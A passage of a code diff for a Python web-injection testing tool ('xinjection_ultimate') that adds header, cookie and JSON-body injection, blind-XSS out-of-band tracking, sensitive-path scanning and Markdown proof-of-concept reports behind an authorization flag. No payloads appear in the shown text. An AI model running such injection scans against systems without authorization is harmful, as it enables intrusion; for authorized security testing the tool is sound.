+                logging.exception(f"Future error in orchestrate: {e}")
+    # Save results bundle
+    bundle = {"meta": {"generated_at": time.time(), "tool": "xinjection_ultimate"}, "results": results, "scans": scans, "oob_registry": oob_registry}
     try:
-        if output_format == "csv":
-            if not results:
-                atomic_write(output_path, "")
-            else:
+        if out_fmt == "csv":
+            # results -> CSV, scans -> JSON sidefile, oob -> JSON sidefile
+            res_file = out_path
+            scan_file = out_path + ".scans.json"
+            oob_file = out_path + ".oob.json"
+            if results:
                 keys = sorted(set().union(*(r.keys() for r in results)))
-                with open(output_path, "w", newline="", encoding="utf-8") as outf:
-                    writer = csv.DictWriter(outf, fieldnames=keys)
-                    writer.writeheader()
+                with open(res_file, "w", newline="", encoding="utf-8") as f:
+                    w = csv.DictWriter(f, fieldnames=keys); w.writeheader()
                     for r in results:
-                        row = {k: (json.dumps(v, ensure_ascii=False) if isinstance(v, (list, dict)) else v) for k, v in r.items()}
-                        writer.writerow(row)
+                        row = {k: (json.dumps(v, ensure_ascii=False) if isinstance(v, (list, dict)) else v) for k,v in r.items()}
+                        w.writerow(row)
+            else:
+                open(res_file, "w").close()
+            atomic_write(scan_file, json.dumps(scans, indent=2, ensure_ascii=False))
+            atomic_write(oob_file, json.dumps(oob_registry, indent=2, ensure_ascii=False))
         else:
-            atomic_write(output_path, json.dumps(results, indent=2, ensure_ascii=False))
+            atomic_write(out_path, json.dumps(bundle, indent=2, ensure_ascii=False))
     except Exception:
-        logging.exception("Failed to save final results; attempt fallback write.")
-    return results
+        logging.exception("Failed to save results bundle")
+    # Generate Markdown POC reports if requested
+    if generate_report and results:
+        try:
+            report_md = generate_markdown_report(bundle)
+            rpt_path = out_path + ".report.md"
+            atomic_write(rpt_path, report_md)
+            logging.info("Markdown report written to %s", rpt_path)
+        except Exception:
+            logging.exception("Failed to generate markdown report")
+    return bundle
 
-# ----------------------
-# CLI / main
-# ----------------------
+# ---------------- Markdown POC generator ----------------
+def generate_markdown_report(bundle: Dict) -> str:
+    lines = ["# xinjection_ultimate Report", "", f"Generated: {time.ctime(bundle.get('meta',{}).get('generated_at', time.time()))}", ""]
+    results = bundle.get("results", [])
+    for i, r in enumerate(results, start=1):
+        if not r.get("success"):
+            continue
+        lines.append(f"## Finding {i}")
+        lines.append(f"- **Target:** {r.get('target')}")
+        lines.append(f"- **Injection URL:** `{r.get('injection_uri')}`")
+        lines.append(f"- **Method:** {r.get('method')}")
+        lines.append(f"- **Param:** {r.get('injected_param')}")
+        lines.append(f"- **Payload variant:** {r.get('payload_variant')}")
+        lines.append(f"- **Status:** {r.get('status')}")
+        lines.append(f"- **Reasons:** {', '.join(r.get('reasons') or [])}")
+        lines.append("")
+        lines.append("### Request reproduction")
+        lines.append("```\n# Sample request - adjust for context\nGET " + r.get("injection_uri", "") + "\n```\n")
+        lines.append("### Response snippet")
+        snippet = r.get("snippet","").replace("```","")
+        lines.append("```html\n" + snippet + "\n```")
+        lines.append("")
+        lines.append("### Remediation suggestions")
+        lines.append("- Validate and encode user-supplied input according to context (HTML encode for HTML contexts, JSON encode for API contexts).")
+        lines.append("- Add appropriate Content Security Policy and security headers where applicable.")
+        lines.append("")
+    return "\n".join(lines)
+
+# ---------------- CLI ----------------
 def parse_args():
-    p = argparse.ArgumentParser(
-        prog="xinjection_final.py",
-        description="xinjection_final — terminal/Termux-friendly, robust, legal payload injection tool. "
-                    "Use only on targets you own or are authorized to test. "
-                    "Default payloads are harmless and tokenized. "
-                    "See --confirm requirement below.",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter
-    )
-    p.add_argument("-u", "--url", help="Single target URL (include scheme).")
-    p.add_argument("-l", "--list", help="File path with newline-separated target URLs.")
-    p.add_argument("-p", "--payload", help="Single payload template. Use {token} placeholder to insert unique token.")
-    p.add_argument("--payload-list", help="File with payload templates, one per line.")
-    p.add_argument("--generate", choices=["xss_harmless", "xss_basic", "sqli_test", "lfi_test", "random_tokens"],
-                   help="Generate payload templates for quick runs.")
-    p.add_argument("--gen-count", type=int, default=6, help="Count for generated payload templates.")
-    p.add_argument("--param", help="Specific query parameter to target (optional).")
-    p.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Concurrency workers.")
-    p.add_argument("--min-interval", type=float, default=0.5,
-                   help="Minimum seconds between requests to same target (per-target rate limit).")
-    p.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Base delay between requests (seconds).")
-    p.add_argument("--jitter", type=float, default=DEFAULT_JITTER, help="Max random jitter (seconds).")
-    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="HTTP request timeout (seconds).")
-    p.add_argument("--output", default="xinjection_results.json", help="Output file path (json or csv).")
-    p.add_argument("--format", choices=["json", "csv"], default="json", help="Output format.")
-    p.add_argument("--only-success", action="store_true", help="Save only successful entries.")
-    p.add_argument("--oob-domain", help="Your OOB domain for blind XSS (only use if you control it).")
-    p.add_argument("--playwright", action="store_true", help="Enable Playwright JS verification (desktop/VM only).")
-    p.add_argument("--confirm", required=True, help="Type I_HAVE_AUTH to confirm you are authorized to test targets.")
-    return p.parse_args()
+    ap = argparse.ArgumentParser(prog="xinjection_ultimate.py",
+                                description="xinjection_ultimate — ultimate legal payload testing tool. Use only on targets you are authorized to test.",
+                                formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    ap.add_argument("-u","--url", help="Single target URL (include scheme).")
+    ap.add_argument("-l","--list", help="File with target URLs (one per line).")
+    ap.add_argument("-p","--payload", help="Single payload template (use {token} placeholder).")
+    ap.add_argument("--payload-list", help="File with payload templates.")
+    ap.add_argument("--generate", choices=["xss_harmless","xss_basic","xss_blind","sqli_test","lfi_test","random_tokens"], help="Generate payload templates.")
+    ap.add_argument("--gen-count", type=int, default=6, help="Count for generated templates.")
+    ap.add_argument("--oob-domain", help="Your OOB domain (required for xss_blind).")
+    ap.add_argument("--method", choices=["GET","POST"], default="GET", help="HTTP method to use.")
+    ap.add_argument("--json", action="store_true", dest="json_body", help="When POST, send JSON body (puts payload into typical JSON fields).")
+    ap.add_argument("--inject-headers", help="Comma-separated header names to inject payload into (e.g. 'User-Agent,Referer').")
+    ap.add_argument("--header-templates", help="File with header templates (Header: value with {payload} or {token}).")
+    ap.add_argument("--inject-cookies", action="store_true", help="Inject payload into a cookie value.")
+    ap.add_argument("--param", help="Specific parameter name to target (optional).")
+    ap.add_argument("--threads", type=int, default=DEFAULT_THREADS)
+    ap.add_argument("--min-interval", type=float, default=0.5, help="Min seconds between requests to same host.")
+    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Base delay between requests.")
+    ap.add_argument("--jitter", type=float, default=DEFAULT_JITTER, help="Random jitter to add to delay.")
+    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
+    ap.add_argument("--probe-json", action="store_true", help="Safe JSON probe (opt-in) to detect JSON endpoints.")
+    ap.add_argument("--scan", action="store_true", help="Run misconfig & outdated checks (lightweight).")
+    ap.add_argument("--playwright", action="store_true", help="Enable Playwright JS/DOM verification (desktop only).")
+    ap.add_argument("--only-success", action="store_true", help="Save only successful entries.")
+    ap.add_argument("--output", default="xinjection_ultimate_results.json", help="Output file path.")
+    ap.add_argument("--format", choices=["json","csv"], default="json", help="Output format.")
+    ap.add_argument("--report", action="store_true", help="Generate Markdown POC report for successes.")
+    ap.add_argument("--confirm", required=True, help="Type I_HAVE_AUTH to confirm authorization.")
+    return ap.parse_args()
 
 def main():
     print(BANNER)
     args = parse_args()
     if args.confirm != "I_HAVE_AUTH":
-        logging.error("REFUSING: pass --confirm I_HAVE_AUTH to acknowledge authorization.")
+        print(color("[!] REFUSING: pass --confirm I_HAVE_AUTH to acknowledge authorization.", "red"))
         sys.exit(1)
+    # targets
     targets: List[str] = []
     if args.url:
         targets.append(args.url.strip())
     if args.list:
         if not os.path.exists(args.list):
-            logging.error("Targets file not found: %s", args.list)
-            sys.exit(1)
+            logging.error("Targets file not found: %s", args.list); sys.exit(1)
         targets += load_lines(args.list)
     if not targets:
-        logging.error("No targets provided (use -u or -l).")
-        sys.exit(1)
-    payload_templates: List[str] = []
+        logging.error("No targets provided (use -u or -l)."); sys.exit(1)
+    # payloads
+    payloads: List[str] = []
     if args.payload:
-        payload_templates.append(args.payload)
+        payloads.append(args.payload)
     if args.payload_list:
         if not os.path.exists(args.payload_list):
-            logging.error("Payload list file not found: %s", args.payload_list)
-            sys.exit(1)
-        payload_templates += load_lines(args.payload_list)
+            logging.error("Payload list file not found: %s", args.payload_list); sys.exit(1)
+        payloads += load_lines(args.payload_list)
     if args.generate:
-        payload_templates += generate_payload_templates(args.generate, args.gen_count, args.oob_domain)
-    # dedupe templates
-    payload_templates = [p for i, p in enumerate(payload_templates) if p and p not in payload_templates[:i]]
-    if not payload_templates:
-        logging.error("No payloads supplied. Use -p, --payload-list, or --generate.")
-        sys.exit(1)
+        try:
+            payloads += gen_templates(args.generate, args.gen_count, args.oob_domain)
+        except ValueError as ve:
+            logging.error(str(ve)); sys.exit(1)
+    # header injection list
+    inject_headers = []
+    if args.inject_headers:
+        inject_headers = [h.strip() for h in args.inject_headers.split(",") if h.strip()]
     if args.playwright and not PLAYWRIGHT_AVAILABLE:
         logging.warning("Playwright not available in this environment; --playwright will be ignored.")
         args.playwright = False
-    logging.info("Starting run: targets=%d payloads=%d threads=%d", len(targets), len(payload_templates), args.threads)
+    # header templates file validation
+    if args.header_templates and not os.path.exists(args.header_templates):
+        logging.error("Header templates file not found: %s", args.header_templates); sys.exit(1)
+    # dedupe templates
+    payloads = [p for i,p in enumerate(payloads) if p and p not in payloads[:i]]
+    if not payloads:
+        logging.error("No payloads specified. Use -p, --payload-list, or --generate."); sys.exit(1)
+    logging.info("Starting run: targets=%d payloads=%d threads=%d method=%s", len(targets), len(payloads), args.threads, args.method)
     start = time.time()
-    results = orchestrate(
+    bundle = orchestrate(
         targets=targets,
-        payload_templates=payload_templates,
+        payload_templates=payloads,
+        method=args.method,
+        inject_headers=inject_headers,
+        header_templates_file=args.header_templates,
+        inject_cookies=args.inject_cookies,
+        json_body_flag=args.json_body,
         param=args.param,
         threads=args.threads,
         min_interval=args.min_interval,
@@ -646,28 +773,34 @@ def main():
         jitter=args.jitter,
         timeout=args.timeout,
         playwright_flag=args.playwright,
-        oob_domain=args.oob_domain,
+        probe_json=args.probe_json,
+        do_scan=args.scan,
+        out_path=args.output,
+        out_fmt=args.format,
         only_success=args.only_success,
-        output_path=args.output,
-        output_format=args.format
+        generate_report=args.report
     )
     elapsed = time.time() - start
-    logging.info("Run completed in %.1f seconds. Collected %d entries.", elapsed, len(results))
-    try:
-        # save final results already done in orchestrate; ensure file exists
-        if not os.path.exists(args.output):
-            atomic_write(args.output, json.dumps(results, indent=2, ensure_ascii=False))
-    except Exception:
-        logging.exception("Saving final results fallback failed.")
-    succ = sum(1 for r in results if r.get("success"))
-    logging.info("Summary: %d successful items detected.", succ)
-    print(color_text(f"\n[DONE] Results saved to {args.output}. Successes: {succ}", "green"))
+    successes = sum(1 for r in bundle.get("results", []) if r.get("success"))
+    logging.info("Run finished in %.1f s. Total results: %d, successes: %d", elapsed, len(bundle.get("results", [])), successes)
+    print(color(f"\n[DONE] Results saved to {args.output} | successes: {successes}", "green"))
+    if args.scan:
+        print(color("\n[SCAN SUMMARY]", "cyan"))
+        for url, s in bundle.get("scans", {}).items():
+            print(color(f"- {url}", "yellow"))
+            sec = s.get("security_headers", {})
+            for h, val in sec.items():
+                print(f"   {h}: {val}")
+            if s.get("old_indicators"):
+                print(color(f"   Old/version hints: {', '.join(s.get('old_indicators'))}", "red"))
+            for fnd in s.get("sensitive", []):
+                print(color(f"   Sensitive path: {fnd.get('path')} (status {fnd.get('status')})", "red"))
     return 0
 
 if __name__ == "__main__":
     try:
         sys.exit(main())
     except Exception as e:
-        logging.exception(f"Fatal error in main: {e}")
-        print(color_text("Fatal error occurred. Check log file: " + LOG_FILE, "red"))
+        logging.exception("Fatal error: %s", e)
+        print(color(f"Fatal error occurred. Check {LOG_FILE}", "red"))
         sys.exit(1)
